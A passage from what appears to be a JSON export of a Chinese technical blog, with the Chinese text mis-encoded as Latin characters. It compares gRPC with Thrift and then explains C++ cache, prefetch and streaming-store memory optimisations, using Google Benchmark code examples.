ä½¿ç”¨å¼€æºå¼‚æ­¥äº‹ä»¶æ¡†æ¶ geventã€‚gevent çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥è®©ç”¨æˆ·ä½¿ç”¨åŒæ­¥çš„ä»£ç ç¼–å†™å¼‚æ­¥çš„é€»è¾‘ã€‚ gRPC çš„ä¸€ä¸ªç‰¹è‰²ä¹‹å¤„åœ¨äºæä¾›äº† Streaming æ¨¡å¼ï¼ˆå»ºç«‹åœ¨ HTTP2.0 çš„ ç‰¹æ€§3 ä¹‹ä¸Šï¼‰ï¼Œå®¢æˆ·ç«¯å¯ä»¥å°†ä¸€è¿ä¸²çš„è¯·æ±‚è¿ç»­å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¹Ÿå¯ä»¥å°†ä¸€è¿ä¸²è¿ç»­çš„å“åº”å›å¤ç»™å®¢æˆ·ç«¯ã€‚Streaming å¯ä»¥ç†è§£ä¸º gRPC çš„å¼‚æ­¥è°ƒç”¨ã€‚ä¸” gRPC Streaming ä¸ºåŒå·¥é€šä¿¡ï¼Œå¯ä»¥åŒæ—¶æ”¶å‘æ¶ˆæ¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å•å‘ Streamingã€‚ gRPC å¯¹å¼‚å¸¸çš„å¤„ç†æ–¹å¼æ˜¯ï¼Œåœ¨å“åº”å¤´å¸§é‡Œä½¿ç”¨ Status å’Œ Status-Message ä¸¤ä¸ª header æ¥æ ‡è¯†å¼‚å¸¸çš„ code å’ŒåŸå› ã€‚ gRPC é»˜è®¤ä¸æ”¯æŒé‡è¯•ï¼Œå¦‚æœ RPC è°ƒç”¨é‡åˆ°é”™è¯¯ï¼Œä¼šç«‹å³å‘ä¸Šå±‚æŠ›å‡ºé”™è¯¯ã€‚è‹¥è¦é‡è¯•ï¼Œéœ€è¦è‡ªè¡Œè®¾è®¡ã€‚ gRPC é»˜è®¤æ”¯æŒè¶…æ—¶é€‰é¡¹ï¼Œå½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œå¯ä»¥æºå¸¦å‚æ•° timeout æŒ‡å®šæœ€é•¿å“åº”æ—¶é—´ï¼Œå¦‚æœ timeout æ—¶é—´å†…ï¼ŒæœåŠ¡å™¨è¿˜æ²¡æœ‰è¿”å›ç»“æœï¼Œå®¢æˆ·ç«¯å°±ä¼šæŠ›å‡ºè¶…æ—¶å¼‚å¸¸ã€‚ gRPC åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æä¾›äº†æ‹¦æˆªå™¨é€‰é¡¹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ‹¦æˆªå™¨æ‹¦æˆªè¯·æ±‚å’Œå“åº”ã€‚æ¯”å¦‚å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡æ‹¦æˆªå™¨ç»Ÿä¸€åœ¨è¯·æ±‚å¤´é‡Œé¢å¢åŠ  metadataï¼ŒæœåŠ¡å™¨å¯ä»¥é€šè¿‡æ‹¦æˆªå™¨æ¥è·Ÿè¸ª RPC è°ƒç”¨æ€§èƒ½ç­‰ã€‚ å…·ä½“ç»†èŠ‚ï¼Œæ¨èæŸ¥çœ‹ Documentation | gRPC å®˜æ–¹æ–‡æ¡£ã€‚ Thriftç®€ä»‹ 12345678910111213+-------------------------------------------+| Server || (single-threaded, event-driven etc) |+-------------------------------------------+| Processor || (compiler generated) |+-------------------------------------------+| Protocol || (JSON, compact etc) |+-------------------------------------------+| Transport || (raw TCP, HTTP etc) |+-------------------------------------------+ Thrift æ˜¯ä¸€ä¸ªå…¨å¥—çš„ RPC æ¡†æ¶ï¼Œæ”¯æŒå¤šç§åè®®ï¼Œå¤šç§ä¼ è¾“æ¨¡å¼å’Œå¤šç§æœåŠ¡å™¨æ¨¡å‹ã€‚ Transport å±‚å¯ä»¥é€‰æ‹©å¤šç§ä¼ è¾“æ¨¡å¼ï¼ŒProtocol å±‚å¯ä»¥é€‰æ‹©å¤šç§åè®®ã€‚ Thrift æ”¯æŒå¤šç§åè®®ï¼Œæœ‰æ–‡æœ¬åè®®æœ‰äºŒè¿›åˆ¶åè®®ã€‚ Thrift æ”¯æŒå¤šç§æœåŠ¡å™¨æ¨¡å¼ï¼Œä¸Šæ–‡æ‰€è¯‰çš„æ‰€æœ‰æ¨¡å¼ï¼Œéƒ½æ”¯æŒã€‚ Thrift æ”¯æŒå¤šç§ä¼ è¾“æ¨¡å¼ï¼Œé™¤äº†æ™®é€šçš„ TCP socket ä¹‹å¤–ï¼Œè¿˜æœ‰å¯¹ ssl çš„æ”¯æŒç­‰ã€‚é€šå¸¸åœ¨ä¼ è¾“å±‚ä½¿ç”¨ç¼“å†²æ¨¡å¼ï¼Œåœ¨åºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œå¾…å®Œæ•´çš„æ¶ˆæ¯ç»“æ„ä½“åºåˆ—åŒ–å®Œæˆåè°ƒç”¨ flush æ–¹æ³•æ‰ä¼šå°†æ¶ˆæ¯ä¼ é€’åˆ°å¯¹æ–¹ï¼Œæœ‰åŠ©äºæå‡ IO æ•ˆç‡ã€‚ Thrift çš„åè®®æ–‡ä»¶è¦æ¯” gRPC ç®€æ´å¤šäº†ï¼Œå‚æ•°å’Œè¿”å›æ”¯æŒå¾ˆå¤šåŸç”Ÿç±»å‹ã€‚gRPC åˆ™å¿…é¡»ä½¿ç”¨æŒ‡å®šç±»å‹ï¼Œæ‰€ä»¥è¾“å…¥å’Œè¾“å‡ºéƒ½è¦å®šä¹‰ message ç»“æ„ä½“ã€‚ Thrift çš„è¶…æ—¶æœºåˆ¶æ˜¯é€šè¿‡å¥—æ¥å­—çš„ timeout å±æ€§æ¥æ§åˆ¶è¯»å†™è¶…æ—¶çš„ï¼ŒgRPC åˆ™æ˜¯é€šè¿‡å®šæ—¶å™¨æ¥æ§åˆ¶çš„ã€‚Thrift å®¢æˆ·ç«¯ä¸€æ—¦å‡ºç°è¶…æ—¶ï¼Œå°±ä¼šå…³é—­è¿æ¥ã€‚ å…·ä½“å¯å‚è§ Apache Thrift - Concepts å®˜æ–¹æ–‡æ¡£ã€‚ ä¸gRPCå¯¹æ¯”ï¼š åœ¨åè®®çš„æ•ˆç‡ä¸Š gRPC åŸºäº HTTP2.0 åè®®ï¼Œè¿™ä¸ªè‚¯å®šæ˜¯æ— æ³•æŠ—è¡¡ Thrift çº¯ç²¹çš„äºŒè¿›åˆ¶åè®®çš„ã€‚ gRPC çš„å®¢æˆ·ç«¯æ˜¯å¤šè·¯å¤ç”¨çš„çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯ä»¥æ‹¿è¿‡æ¥ç›´æ¥ä½¿ç”¨ã€‚Thrift çš„å®¢æˆ·ç«¯è¿˜éœ€è¦ç”¨æˆ·è‡ªå·±å»å°è£…ä¸€ä¸ªè¿æ¥æ± æ‰èƒ½ä½¿ç”¨ã€‚ gRPC è™½ç„¶ä½¿ç”¨äº†ç¨å¾®æµªè´¹æµé‡çš„ HTTP2.0 åè®®ï¼Œä½†æ˜¯è€ƒè™‘åˆ° HTTP åè®®çš„å¹¿æ³›æ€§ï¼Œæ”¯æŒ HTTP2.0 çš„ä»£ç†æœåŠ¡å™¨ä¸­é—´ä»¶ã€è´Ÿè½½å‡è¡¡ä¸­é—´ä»¶å¾ˆå¤šï¼ŒgRPC å¯ä»¥ç›´æ¥é€æ˜åœ°åœ¨è¿™äº›ä¸­é—´ä»¶ä¹‹é—´è¿›è¡Œè½¬å‘è€Œæ— éœ€è¿›è¡Œå¤æ‚çš„åè®®è½¬æ¢å·¥ä½œã€‚Thrift å…¼å®¹æ€§å°±å·®çš„å¤ªè¿œäº†ã€‚ Thrift çš„æºç è¦ç®€å•å¾ˆå¤šï¼Œå®ƒçš„ py ç‰ˆæœ¬å‡ ä¹å…¨æ˜¯çº¯ç²¹çš„ Python è¯­è¨€ç¼–å†™çš„ï¼Œå¦‚æœè¦ç ”ç©¶æºç çš„è¯ï¼Œè¿˜æ˜¯åº”è¯¥é€‰æ‹© Thriftã€‚gRPC çš„æºç ï¼Œ c è¯­è¨€å®ç°ï¼Œä»£ç é‡å¾ˆå¤§ï¼Œä¸å¦‚çœ‹ gRPC çš„ä¸°å¯Œçš„æ–‡æ¡£æ¥å¾—ç›´æ¥ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"RPC","slug":"Notes/RPC","permalink":"https://racleray.github.io/categories/Notes/RPC/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"},{"name":"RPC","slug":"RPC","permalink":"https://racleray.github.io/tags/RPC/"}],"author":"HeRui"},{"title":"C++è®¿å­˜ä¼˜åŒ–","slug":"C-è®¿å­˜ä¼˜åŒ–","date":"2023-06-19T14:30:42.000Z","updated":"2024-01-09T10:24:49.646Z","comments":true,"path":"posts/d47a1979.html","link":"","permalink":"https://racleray.github.io/posts/d47a1979.html","excerpt":"C++ å†…å­˜è®¿é—®ä¼˜åŒ–","text":"CPU-bound ä¸ Memory-bound CPUå¹¶è¡Œèƒ½åŠ é€Ÿè®¡ç®—ï¼Œå¹¶ä¸èƒ½åŠ é€Ÿå†…å­˜è¯»å†™ã€‚ å¸¸è§è¯»å†™å’Œè®¡ç®—çš„æ—¶é—´èŠ±è´¹å¯¹æ¯”ï¼š L1/2/3 readå’ŒMain RAM readçš„æ—¶é—´æŒ‡çš„æ˜¯è¯»ä¸€ä¸ªç¼“å­˜è¡Œï¼ˆ64å­—èŠ‚ï¼‰æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ ä¸€çº§ç¼“å­˜åˆ†ä¸ºæ•°æ®ç¼“å­˜å’ŒæŒ‡ä»¤ç¼“å­˜ï¼Œå…¶ä¸­æ•°æ®ç¼“å­˜æœ‰ 32 KBï¼Œ6 ä¸ªç‰©ç†æ ¸å¿ƒæ¯ä¸ªéƒ½æœ‰ä¸€ä¸ªï¼Œæ€»å…± 192 KBã€‚è€ŒæŒ‡ä»¤ç¼“å­˜çš„å¤§å°åˆšå¥½å’Œæ•°æ®ç¼“å­˜ä¸€æ ·ä¹Ÿæ˜¯ 192 KBã€‚ äºŒçº§ç¼“å­˜æœ‰ 256 KBï¼Œ6 ä¸ªç‰©ç†æ ¸å¿ƒæ¯ä¸ªéƒ½æœ‰ä¸€ä¸ªï¼Œæ€»å…± 1.5 MBã€‚ ä¸‰çº§ç¼“å­˜ç”±å„ä¸ªç‰©ç†æ ¸å¿ƒå…±äº«ï¼Œæ€»å…± 12 MBã€‚ è‹¥ä»ä¸»å­˜è¯»å–ä¸€ä¸ªfloatï¼Œå¤§çº¦èŠ±è´¹æ—¶é—´ 125 / 64 * 4 = 8 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ï¼ˆ125ï¼šä»ä¸»å­˜è¯»å–ä¸€ä¸ªç¼“å­˜è¡Œçš„æ—¶é—´ï¼Œ64ï¼šä¸€ä¸ªç¼“å­˜è¡Œ64å­—èŠ‚ï¼Œ4ï¼šä¸€ä¸ªæµ®ç‚¹æ•°4å­—èŠ‚ï¼‰ ä¹Ÿå°±æ˜¯è¯´æƒ³è¦é¿å… mem-bound å……åˆ†åˆ©ç”¨CPUæ ¸å¿ƒçš„è®¡ç®—èƒ½åŠ›ï¼Œå°±éœ€è¦åœ¨è®¡ç®—ä»»åŠ¡éƒ¨åˆ†æœ‰è¶³å¤Ÿçš„è®¡ç®—é‡ï¼Œä½¿å¾—è®¡ç®—èŠ±è´¹æ—¶é—´ä¸å°äºå†…å­˜è¯»å†™èŠ±è´¹çš„æ—¶é—´ã€‚ å¦å¤–ï¼Œå¦‚æœæ•°æ®èƒ½å¤Ÿå……åˆ†åœ¨é«˜é€Ÿç¼“å­˜ä¸­è¯»å–ï¼Œä¹Ÿèƒ½å¤Ÿèµ·åˆ°é¿å… mem-bound çš„ä½œç”¨ã€‚ ç¼“å­˜æœºåˆ¶ è¯» ç¼“å­˜ä¼šæŸ¥æ‰¾å’Œè¯¥åœ°å€åŒ¹é…çš„æ¡ç›®ã€‚å¦‚æœæ‰¾åˆ°ï¼Œåˆ™ç»™CPUè¿”å›ç¼“å­˜ä¸­çš„æ•°æ®ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™å‘ä¸»å†…å­˜å‘é€è¯·æ±‚ï¼Œç­‰è¯»å–åˆ°è¯¥åœ°å€çš„æ•°æ®ï¼Œå°±åˆ›å»ºä¸€ä¸ªæ–°æ¡ç›®ã€‚ åœ¨ x86 æ¶æ„ä¸­æ¯ä¸ªæ¡ç›®çš„å­˜å‚¨ 64 å­—èŠ‚çš„æ•°æ®ï¼Œè¿™ä¸ªæ¡ç›®åˆç§°ä¹‹ä¸ºç¼“å­˜è¡Œï¼ˆcachelineï¼‰ã€‚å½“è®¿é—® 0x0048~0x0050 è¿™ 4 ä¸ªå­—èŠ‚æ—¶ï¼Œå®é™…ä¼šå¯¼è‡´ 0x0040~0x0080 çš„ 64 å­—èŠ‚æ•°æ®æ•´ä¸ªè¢«è¯»å–åˆ°ç¼“å­˜ä¸­ã€‚ ä¸ºäº†ä¸æµªè´¹ç¼“å­˜è¡Œçš„å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥æŠŠæ•°æ®ç»“æ„çš„èµ·å§‹åœ°å€å’Œå¤§å°å¯¹é½åˆ° 64 å­—èŠ‚ã€‚ è®¾è®¡æ•°æ®ç»“æ„æ—¶ï¼Œåº”è¯¥æŠŠæ•°æ®å­˜å‚¨çš„å°½å¯èƒ½ç´§å‡‘ï¼Œä¸è¦æ¾æ•£æ’åˆ—ã€‚æœ€å¥½æ¯ä¸ªç¼“å­˜è¡Œé‡Œè¦ä¹ˆæœ‰æ•°æ®ï¼Œè¦ä¹ˆæ²¡æ•°æ®ï¼Œé¿å…è¯»å–ç¼“å­˜è¡Œæ—¶æµªè´¹ä¸€éƒ¨åˆ†ç©ºé—´æ²¡ç”¨ã€‚ å†™ ç¼“å­˜ä¼šæŸ¥æ‰¾å’Œè¯¥åœ°å€åŒ¹é…çš„æ¡ç›®ã€‚å¦‚æœæ‰¾åˆ°ï¼Œåˆ™ä¿®æ”¹ç¼“å­˜ä¸­è¯¥åœ°å€çš„æ•°æ®ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ¡ç›®æ¥å­˜å‚¨CPUå†™çš„æ•°æ®ï¼Œå¹¶æ ‡è®°ä¸ºè„ï¼ˆdirtyï¼‰ã€‚ å½“è¯»å’Œå†™åˆ›å»ºçš„æ–°æ¡ç›®è¿‡å¤šï¼Œç¼“å­˜å¿«è¦å¡ä¸ä¸‹æ—¶ï¼Œä»–ä¼šæŠŠæœ€ä¸å¸¸ç”¨çš„é‚£ä¸ªæ¡ç›®ç§»é™¤ï¼Œè¿™ä¸ªç°è±¡ç§°ä¸ºå¤±æ•ˆï¼ˆinvalidï¼‰ã€‚å¦‚æœé‚£ä¸ªæ¡ç›®æ˜¯è¢«æ ‡è®°ä¸ºè„çš„ï¼Œåˆ™è¯´æ˜æ˜¯å½“æ—¶æ‰“ç®—å†™å…¥çš„æ•°æ®ï¼Œé‚£å°±éœ€è¦å‘ä¸»å†…å­˜å‘é€å†™å…¥è¯·æ±‚ï¼Œç­‰ä»–å†™å…¥æˆåŠŸï¼Œæ‰èƒ½å®‰å…¨ç§»é™¤è¿™ä¸ªæ¡ç›®ã€‚ æœ‰å¤šçº§ç¼“å­˜ï¼Œåˆ™ä¸€çº§ç¼“å­˜å¤±æ•ˆåä¼šä¸¢ç»™äºŒçº§ç¼“å­˜ã€‚ éšæœºè®¿é—® ä¾‹å¦‚å¯¹floatè¿›è¡Œè®¿é—®ï¼Œéšæœºè®¿é—®ä¸€ä¸ªfloatå€¼ï¼Œè€Œè¿™å¯¼è‡´ä»–é™„è¿‘çš„64å­—èŠ‚éƒ½è¢«è¯»å–åˆ°ç¼“å­˜äº†ï¼Œä½†å®é™…åªç”¨åˆ°äº†å…¶ä¸­4å­—èŠ‚ï¼Œä¹‹ååˆæ²¡ç”¨åˆ°å‰©ä¸‹çš„60å­—èŠ‚ï¼Œå¯¼è‡´æµªè´¹äº†94%çš„å¸¦å®½ã€‚ è§£å†³æ–¹æ³•å°±æ˜¯ï¼ŒæŠŠæ•°æ®æŒ‰64å­—èŠ‚å¤§å°åˆ†å—ã€‚éšæœºè®¿é—®æ—¶ï¼Œåªéšæœºå—çš„ä½ç½®ï¼Œè€Œå—çš„å†…éƒ¨ä»ç„¶æŒ‰é¡ºåºè®¿é—®ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);static uint32_t randomize(uint32_t i) &#123; i = (i ^ 61) ^ (i &gt;&gt; 16); i *= 9; i ^= i &lt;&lt; 4; i *= 0x27d4eb2d; i ^= i &gt;&gt; 15; return i;&#125;void BM_random_64B(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n / 16; i++) &#123; size_t r = randomize(i) % (n / 16); for (size_t j = 0; j &lt; 16; j++) &#123; benchmark::DoNotOptimize(a[r * 16 + j]); &#125; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_random_64B);BENCHMARK_MAIN(); prefetch å½“ç¨‹åºé¡ºåºè®¿é—® a[0], a[1] æ—¶ï¼ŒCPUä¼šæ™ºèƒ½åœ°é¢„æµ‹åˆ°ä½ æ¥ä¸‹æ¥å¯èƒ½ä¼šè¯»å– a[2]ï¼Œäºæ˜¯ä¼šæå‰ç»™ç¼“å­˜å‘é€ä¸€ä¸ªè¯»å–æŒ‡ä»¤ï¼Œè®©ä»–è¯»å– a[2]ã€a[3]ã€‚ è¿™æ ·ç­‰ a[0], a[1] å¤„ç†å®Œä»¥åï¼Œç¼“å­˜ä¹Ÿåˆšå¥½è¯»å–å®Œ a[2] äº†ï¼Œä»è€ŒCPUä¸ç”¨ç­‰å¾…ï¼Œå°±å¯ä»¥ç›´æ¥å¼€å§‹å¤„ç† a[2]ï¼Œé¿å…ç­‰å¾…æ•°æ®çš„æ—¶å€™CPUç©ºè½¬æµªè´¹æ—¶é—´ã€‚ ä¸€èˆ¬æ¥è¯´åªæœ‰çº¿æ€§çš„åœ°å€è®¿é—®è§„å¾‹ï¼ˆåŒ…æ‹¬é¡ºåºã€é€†åºï¼›è¿ç»­ã€è·¨æ­¥(æŒ‰å›ºå®šé—´éš”è·³è·ƒ)ï¼‰èƒ½è¢«è¯†åˆ«å‡ºæ¥ï¼Œè€Œå¦‚æœä½ çš„è®¿å­˜æ˜¯éšæœºçš„ï¼Œé‚£å°±æ²¡åŠæ³•é¢„æµ‹ã€‚ å¯¹äºä¸å¾—ä¸éšæœºè®¿é—®å¾ˆå°ä¸€å—çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ _mm_prefetch æŒ‡ä»¤æ‰‹åŠ¨é¢„å–ä¸€ä¸ªç¼“å­˜è¡Œã€‚ å¦‚æœ prefetch æˆåŠŸï¼Œå°±å¯ä»¥åœ¨è®¡ç®—çš„åŒæ—¶ï¼Œæå‰å‡†å¤‡å¥½ä¸‹ä¸€æ¬¡è®¡ç®—çš„æ•°æ®ï¼Œä¸è‡³äºCPUç©ºè½¬ï¼ŒåŒæ—¶å°†è¾ƒçŸ­çš„CPUè®¡ç®—æ—¶é—´æ¶ˆè€—ï¼Œéšè—åœ¨å†…å­˜è¯»å†™çš„è¿‡ç¨‹ä¸­ã€‚ å†…å­˜é¡µ ç°åœ¨æ“ä½œç³»ç»Ÿç®¡ç†å†…å­˜æ˜¯ç”¨åˆ†é¡µï¼ˆpageï¼‰ï¼Œç¨‹åºçš„å†…å­˜æ˜¯ä¸€é¡µä¸€é¡µè´´åœ¨åœ°å€ç©ºé—´ä¸­çš„ï¼Œæœ‰äº›åœ°æ–¹å¯èƒ½ä¸å¯è®¿é—®ï¼Œæˆ–è€…è¿˜æ²¡æœ‰åˆ†é…ï¼Œåˆ™æŠŠè¿™ä¸ªé¡µè®¾ä¸ºä¸å¯ç”¨çŠ¶æ€ï¼Œè®¿é—®ä»–å°±ä¼šå‡ºé”™ï¼Œè¿›å…¥å†…æ ¸æ¨¡å¼ã€‚ prefetchä¸èƒ½è·¨è¶Šé¡µè¾¹ç•Œï¼Œå¦åˆ™å¯èƒ½ä¼šè§¦å‘ä¸å¿…è¦çš„ page faultã€‚ å¯ä»¥ç”¨ _mm_alloc ç”³è¯·èµ·å§‹åœ°å€å¯¹é½åˆ°é¡µè¾¹ç•Œçš„ä¸€æ®µå†…å­˜ã€‚ å½“éšæœºè®¿é—®æ•°æ®æ—¶ï¼Œå¯ä»¥æŒ‰4KBå¤§å°çš„å—éšæœºè®¿é—®ï¼Œåœ¨å—å†…éƒ¨å°±å¯ä»¥é¡ºåºè®¿é—®ï¼Œå‘æŒ¥prefetchçš„ä¼˜åŠ¿ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);void BM_random_4KB_aligned(benchmark::State &amp;bm) &#123; float *a = (float *)_mm_malloc(n * sizeof(float), 4096); memset(a, 0, n * sizeof(float)); for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n / 1024; i++) &#123; size_t r = randomize(i) % (n / 1024); for (size_t j = 0; j &lt; 1024; j++) &#123; benchmark::DoNotOptimize(a[r * 1024 + j]); &#125; &#125; benchmark::DoNotOptimize(a); &#125; _mm_free(a);&#125;BENCHMARK(BM_random_4KB_aligned);BENCHMARK_MAIN(); ä¸ºä»€ä¹ˆå†™å…¥æ¯”è¯»å–æ…¢ï¼Ÿ å› ä¸ºç¼“å­˜å’Œå†…å­˜é€šä¿¡çš„æœ€å°å•ä½æ˜¯ç¼“å­˜è¡Œï¼š64å­—èŠ‚ã€‚å½“CPUè¯•å›¾å†™å…¥4å­—èŠ‚æ—¶ï¼Œå› ä¸ºå‰©ä¸‹çš„60å­—èŠ‚æ²¡æœ‰æ”¹å˜ï¼Œç¼“å­˜ä¸çŸ¥é“CPUæ¥ä¸‹æ¥ä¼šä¸ä¼šç”¨åˆ°é‚£60å­—èŠ‚ï¼Œå› æ­¤ä»–åªå¥½ä»å†…å­˜è¯»å–å®Œæ•´çš„64å­—èŠ‚ï¼Œä¿®æ”¹å…¶ä¸­çš„4å­—èŠ‚ä¸ºCPUç»™çš„æ•°æ®ï¼Œä¹‹åå†æ‹©æœºå†™å›ã€‚ å†™å…¥å°‘äº64å­—èŠ‚çš„æ•°æ®æ—¶ï¼Œè™½ç„¶æ²¡æœ‰ç”¨åˆ°å…¨éƒ¨çš„è¯»å–æ•°æ®ï¼Œä½†å®é™…ä¸Šç¼“å­˜è¿˜æ˜¯ä»å†…å­˜è¯»å–äº†ï¼Œä»è€Œæµªè´¹äº†2å€å¸¦å®½ã€‚ _mm_stream_si32 ç»•è¿‡ç¼“å­˜ï¼Œç›´æ¥å†™å…¥ã€‚ç”¨ _mm_stream_si32 æŒ‡ä»¤ä»£æ›¿ç›´æ¥èµ‹å€¼çš„å†™å…¥ï¼Œä»–èƒ½å¤Ÿç»•å¼€ç¼“å­˜ï¼Œå°†ä¸€ä¸ª4å­—èŠ‚çš„å†™å…¥æ“ä½œï¼ŒæŒ‚èµ·åˆ°ä¸´æ—¶é˜Ÿåˆ—ï¼Œç­‰å‡‘æ»¡64å­—èŠ‚åï¼Œç›´æ¥å†™å…¥å†…å­˜ï¼Œä»è€Œå®Œå…¨é¿å…è¯»çš„å¸¦å®½ã€‚åªæ”¯æŒintåšå‚æ•°ï¼Œè¦ç”¨floatè¿˜å¾—è½¬æ¢ä¸€ä¸‹æŒ‡é’ˆç±»å‹ã€‚ _mm ç³»åˆ—æŒ‡ä»¤å‡ºè‡ª &lt;xmmintrin.h&gt; å¤´æ–‡ä»¶ã€‚æŒ‡ä»¤çš„æ–‡æ¡£ Intel Intrinsics Guideã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;float&gt; a(n);void BM_write_stream_then_read(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; float value = 1; _mm_stream_si32((int *)&amp;a[i], *(int *)&amp;value); benchmark::DoNotOptimize(a[i]); &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write_stream_then_read);BENCHMARK_MAIN(); å› ä¸º _mm_stream_si32 ä¼šç»•å¼€ç¼“å­˜ï¼Œç›´æ¥æŠŠæ•°æ®å†™åˆ°å†…å­˜ï¼Œä¹‹åè¯»å–çš„è¯ï¼Œåè€Œéœ€è¦ç­‰å¾… stream å†™å›æ‰§è¡Œå®Œæˆï¼Œç„¶åé‡æ–°è¯»å–åˆ°ç¼“å­˜ï¼Œåè€Œæ›´ä½æ•ˆã€‚ å› æ­¤ï¼Œä»…å½“è¿™äº›æƒ…å†µï¼š è¯¥æ•°ç»„åªæœ‰å†™å…¥ï¼Œä¹‹å‰å®Œå…¨æ²¡æœ‰è¯»å–è¿‡ã€‚ ä¹‹åæ²¡æœ‰å†è¯»å–è¯¥æ•°ç»„çš„åœ°æ–¹ã€‚ æ‰åº”è¯¥ç”¨ stream æŒ‡ä»¤ã€‚ å¦å¤–ï¼Œ_mm_stream_ps å¯ä»¥ä¸€æ¬¡æ€§å†™å…¥ 16 å­—èŠ‚åˆ°æŒ‚èµ·é˜Ÿåˆ—ï¼Œæ›´åŠ é«˜æ•ˆã€‚ä¸è¿‡ï¼Œ_mm_stream_ps å†™å…¥çš„åœ°å€å¿…é¡»å¯¹é½åˆ° 16 å­—èŠ‚ï¼Œå¦åˆ™ä¼šäº§ç”Ÿæ®µé”™è¯¯ç­‰å¼‚å¸¸ã€‚ æ³¨æ„ï¼Œstream ç³»åˆ—æŒ‡ä»¤å†™å…¥çš„åœ°å€ï¼Œå¿…é¡»æ˜¯è¿ç»­çš„ï¼Œä¸­é—´ä¸èƒ½æœ‰è·¨æ­¥ï¼ˆå›ºå®šé—´éš”ï¼‰ï¼Œå¦åˆ™æ— æ³•åˆå¹¶å†™å…¥ï¼Œä¼šäº§ç”Ÿæœ‰ä¸­é—´æ•°æ®è¯»çš„å¸¦å®½ã€‚ ä¸ºä»€ä¹ˆå¯¹æ•°ç»„å†™å…¥å…¨1æ¯”å…¨0æ…¢ï¼Ÿ å› ä¸ºå†™å…¥0è¢«ç¼–è¯‘å™¨è‡ªåŠ¨ä¼˜åŒ–æˆäº†memsetï¼Œè€Œmemsetå†…éƒ¨åˆ©ç”¨äº†streamæŒ‡ä»¤å¾—ä»¥æ›´å¿«å†™å…¥ã€‚è€Œå…¨1å¹¶ä¸ä¼šè°ƒç”¨streamæŒ‡ä»¤ã€‚ å¯ä»¥æ‰‹åŠ¨è°ƒç”¨streamæŒ‡ä»¤å†™å…¥å…¨1ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;constexpr size_t n = 1&lt;&lt;27; // 512MBstd::vector&lt;int&gt; a(n);void BM_write0(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; a[i] = 0; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write0);void BM_write1(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; a[i] = 1; &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write1);void BM_write1_streamed(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123;#pragma omp parallel for for (size_t i = 0; i &lt; n; i++) &#123; _mm_stream_si32(&amp;a[i], 1); &#125; benchmark::DoNotOptimize(a); &#125;&#125;BENCHMARK(BM_write1_streamed);BENCHMARK_MAIN(); å¾ªç¯ä»£ç ä¼˜åŒ– å½“å¯¹åŒä¸€ä¸ªæ•°ç»„ï¼Œæ‰§è¡Œä¸¤ç§æ“ä½œï¼Œåœ¨ä¸å½±å“é€»è¾‘æ—¶ï¼Œå°†ä¸¤ä¸ªå¾ªç¯å†™æˆä¸€ä¸ªå¾ªç¯å¯ä»¥åŠ é€Ÿ mem-bound çš„ç¨‹åºæ‰§è¡Œã€‚ åœ¨ä¸»å­˜çœ‹æ¥ï¼Œ CPUåšçš„äº‹æƒ…ç›¸å½“äºï¼šè¯»+å†™+è¯»+å†™ï¼Œæ¯ä¸ªå…ƒç´ 